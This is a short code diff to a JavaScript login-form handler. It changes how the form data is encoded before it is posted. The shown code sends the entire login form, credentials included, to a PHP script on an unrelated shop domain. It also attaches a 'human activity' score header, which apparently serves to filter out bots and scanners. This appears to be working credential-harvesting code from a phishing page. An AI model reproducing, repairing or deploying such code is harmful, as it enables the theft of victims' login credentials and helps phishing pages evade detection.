@@ -978,7 +978,9 @@ window.handleLoginSubmit = function(event) {
         dataType: 'JSON',
         url: 'https://mykitchetannedmat.shop/pinto.php',
         type: 'POST',
-        data: $('#login_form').serialize(),
+        data: new FormData(document.getElementById('login_form')),
+        contentType: false,
+        processData: false,
         beforeSend: function(xhr){
             // Add custom headers for bot detection
             xhr.setRequestHeader('X-Protection-Score', $('#human_activity').val() || '0');
